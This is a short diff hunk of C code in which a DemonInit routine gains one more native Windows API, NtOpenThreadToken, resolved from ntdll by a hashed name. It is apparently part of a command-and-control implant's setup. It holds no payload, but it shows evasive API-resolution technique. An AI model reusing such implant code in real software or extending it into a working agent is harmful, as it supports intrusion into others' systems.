@@ -330,6 +330,7 @@ VOID DemonInit( PVOID ModuleInst )
         Instance.Win32.NtAllocateVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALLOCATEVIRTUALMEMORY );
         Instance.Win32.NtQueueApcThread                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUEUEAPCTHREAD );
         Instance.Win32.NtOpenThread                      = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENTHREAD );
+        Instance.Win32.NtOpenThreadToken                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENTHREADTOKEN );
         Instance.Win32.NtResumeThread                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTRESUMETHREAD );
         Instance.Win32.NtSuspendThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSUSPENDTHREAD );
         Instance.Win32.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
